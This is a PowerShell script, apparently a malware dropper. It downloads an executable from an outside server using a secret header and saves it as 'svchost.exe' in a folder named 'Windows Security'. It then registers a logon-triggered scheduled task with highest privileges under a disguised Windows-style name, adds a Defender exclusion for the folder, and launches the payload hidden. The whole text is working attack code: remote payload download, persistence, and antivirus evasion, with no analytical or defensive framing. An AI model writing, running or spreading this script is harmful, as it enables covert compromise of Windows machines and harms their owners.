$T="6c2c8a56"
$S="Dvwh3j9A7EoEit9sybijacr57kzxrnDuej5A5wf2zxvccoxjpe"
$U="https://ctrl.fr-dev.xyz/api/agent/payload/6c2c8a56/exe"
$D=Join-Path $env:APPDATA "Windows Security"
$E=Join-Path $D "svchost.exe"
New-Item -ItemType Directory -Force -Path $D | Out-Null
if(!(Test-Path $E)){
    Write-Host "Telechargement..."
    [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $U -OutFile $E -Headers @{"x-agent-secret"=$S} -UseBasicParsing
}
$NS=@("WindowsSecurityService","SecurityServiceWindows","WindowsServiceSecurity","SecurityWindowsService")
$TN=$NS|Where-Object{!(Get-ScheduledTask -TaskName $_ -EA SilentlyContinue)}|Select-Object -First 1
if(!$TN){$TN=$NS[0]}
$A=New-ScheduledTaskAction -Execute $E -Argument $T
$G=New-ScheduledTaskTrigger -AtLogOn
$P=New-ScheduledTaskPrincipal -RunLevel Highest -LogonType Interactive -UserId $env:USERNAME
$C=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName $TN -Action $A -Trigger $G -Principal $P -Settings $C -Force | Out-Null
Add-MpPreference -ExclusionPath $D -EA SilentlyContinue
Start-Process -FilePath $E -ArgumentList $T -WindowStyle Hidden
Start-Sleep 1
